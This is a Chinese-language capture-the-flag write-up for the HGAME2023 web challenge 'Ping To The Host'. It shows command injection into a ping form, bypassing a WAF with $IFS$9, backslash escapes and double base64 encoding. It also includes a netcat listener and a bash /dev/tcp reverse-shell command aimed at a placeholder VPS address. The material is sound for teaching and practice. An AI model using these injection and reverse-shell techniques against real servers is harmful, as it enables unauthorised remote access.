# [HGAME2023]Ping To The Host
![](<./img/Pasted image 20230125095243.png>)

![](<./img/Pasted image 20230125095259.png>)

尝试输入正常ip

```
127.0.0.1
```

```
Success
```

输入奇怪的ip

```
abclol
```

```
Failed
```

经过测试WAF把这些东西ban掉了

```
;
flag
cat
tac
<space>
+
echo
sh
<
>
```

似乎只有`Success`和`Failed`的回显，由命令的`exit_code`决定，一开始想通过类似SQL布尔盲注的形式跑脚本，然后发现自己不会写`bash`字符串截取和比较qaq

于是走了反弹`shell`

vps上监听`2333`端口

```shell
nc -lvvp 2333
```

总的来说要在靶机上执行这个

```shell
bash -c "bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/2333 0>&1"
```

空格可以通过`$IFS$9`绕过，对单词的过滤也可以通过反斜杠绕过

对`<`、`>`的过滤通过`base64`编码绕过

```shell
echo 'bash -c "bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/2333 0>&1"' | base64
```

![](<./img/Pasted image 20230125101455.png>)

编码结果里面出现了加号，依然绕不过，因而尝试二次编码

```shell
echo 'bash -c "bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/2333 0>&1"' | base64 | base64
```

![](<./img/Pasted image 20230125101701.png>)

这下没有了，但是非常脸黑地编码结果中刚好有被过滤的单词，懒得一个一个找直接一锅端了

```
a&ec\ho$IFS$9\W\W\1\G\e\m...\Q\z\h\5\T\X\p\N\e\k\l\E\Q\S\t\K\a\k\V\p\Q\2\c\9\P\Q\o\=|base64$IFS$9-d|base64$IFS$9-d|bas\h
```

![](<./img/Pasted image 20230125102444.png>)

#Web #RCE #反弹shell #绕过 #shell 